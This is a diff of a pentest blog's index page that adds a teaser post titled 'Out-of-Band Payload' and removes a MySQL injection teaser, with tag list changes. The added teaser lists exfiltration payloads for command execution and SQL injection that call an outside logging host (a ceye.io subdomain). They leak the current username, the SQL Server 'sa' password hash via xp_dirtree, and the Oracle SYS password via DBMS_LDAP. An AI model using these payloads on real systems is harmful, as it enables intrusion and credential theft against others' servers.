@@ -137,6 +137,39 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/09/10/others/Out-of-Band Payload/" >Out-of-Band Payload</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-09-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="0x00-Command-Execution"><a href="#0x00-Command-Execution" class="headerlink" title="0x00 Command Execution"></a>0x00 Command Execution</h1><h2 id="i-nix"><a href="#i-nix" class="headerlink" title="i. nix:"></a>i. nix:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h2 id="ii-windows"><a href="#ii-windows" class="headerlink" title="ii. windows"></a>ii. windows</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-SQL-Injection"><a href="#0x01-SQL-Injection" class="headerlink" title="0x01 SQL Injection"></a>0x01 SQL Injection</h1><h2 id="i-SQL-Server"><a href="#i-SQL-Server" class="headerlink" title="i. SQL Server"></a>i. SQL Server</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=&#x27;sa&#x27;)</span><br><span class="line">+&#x27;.ip.port.b182oj.ceye.io&#x27;;</span><br><span class="line">EXEC(&#x27;master..xp_dirtree</span><br><span class="line">&quot;\\&#x27;+@host+&#x27;\foobar$&quot;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="ii-Oracle"><a href="#ii-Oracle" class="headerlink" title="ii. Oracle"></a>ii. Oracle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&#x27;ip.port.b182oj.ceye.io&#x27;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&#x27;http://ip.port.b182oj.ceye.io/oracle&#x27;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&#x27;http://ip.port.b182oj.ceye.io/oracle&#x27;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&#x27;oracle.ip.port.b182oj.ceye.io&#x27;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&#x27;SYS&#x27;)||&#x27;.ip.port.b182oj.ceye.io&#x27;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/09/10/others/Out-of-Band Payload/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/08/20/pentest/privesc/Mysql UDF/" >MySQL UDF</a>
 		</h3>
 		</div>
@@ -187,49 +220,6 @@
 	
 	</div>
   <a type="button" href="/2023/08/20/pentest/privesc/Mysql UDF/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/07/30/pentest/web-pentest/Mysql Injections/" >Mysql Injections</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-07-30  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="Mysql-Injections"><a href="#Mysql-Injections" class="headerlink" title="Mysql Injections"></a>Mysql Injections</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
-<li><code>Spaces</code>：如果未编码，可能表示请求数据的结束</li>
-<li><code>&amp;</code>: 解释为参数分隔符</li>
-<li><code>#</code>: 解释为片段标识符</li>
-</ul>
-<p><strong>GET请求</strong><code>#</code>和 <code>-- ?</code> (?可以为任意字符) 表示注释，可以使它们后面的语句不被执行，可以使用<code>--%20</code>，把空格转换为urlcode编码格式，同理把<code>#</code>变成<code>%23</code>，也可以注释</p>
-<p><strong>POST请求</strong><code>#</code>和<code>--?</code>都能注释后面的语句</p>
-<h3 id="schema结构："><a href="#schema结构：" class="headerlink" title="schema结构："></a>schema结构：</h3><ul>
-<li>information_schema.schemata：记录数据库信息的表</li>
-<li>information_schema.tables：记录表名信息的表</li>
-<li>information_schema.columns：记录列名信息的表</li>
-<li>schema_name：数据库名</li>
-<li>table_name：表名</li>
-<li>column_name：列名</li>
-<li>table_schema：表的数据库名</li>
-</ul>
-<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>可以使用 union 语句，且有回显位</p>
-	
-	</div>
-  <a type="button" href="/2023/07/30/pentest/web-pentest/Mysql Injections/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -286,7 +276,7 @@
 		
 			<li><a href="/categories/Javascript/">Javascript<span>1</span></a></li>
 		
-			<li><a href="/categories/Others/">Others<span>1</span></a></li>
+			<li><a href="/categories/Others/">Others<span>2</span></a></li>
 		
 			<li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
 		
@@ -309,48 +299,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/General/">General<span>1</span></a></li>
+		
+			<li><a href="/tags/Payload/">Payload<span>1</span></a></li>
+		
+			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
 			<li><a href="/tags/Http/">Http<span>1</span></a></li>
 		
+			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
+		
 			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
+		
+			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
 		
 			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
 		
 			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
 		
-			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
-		
-			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
-		
-			<li><a href="/tags/Base/">Base<span>5</span></a></li>
-		
-			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
-		
-			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
-		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
-		
 			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
-		
-			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
-		
-			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
-		
-			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
-		
-			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
-		
-			<li><a href="/tags/CISCN/">CISCN<span>2</span></a></li>
-		
-			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
-		
-			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
-		
-			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
 		
 			<li><a href="/tags/Ethernaut/">Ethernaut<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>22</span></a></li>
+		   <li><a href="/tags">...<span>23</span></a></li>
 		 
 		</ul>
 	</div>
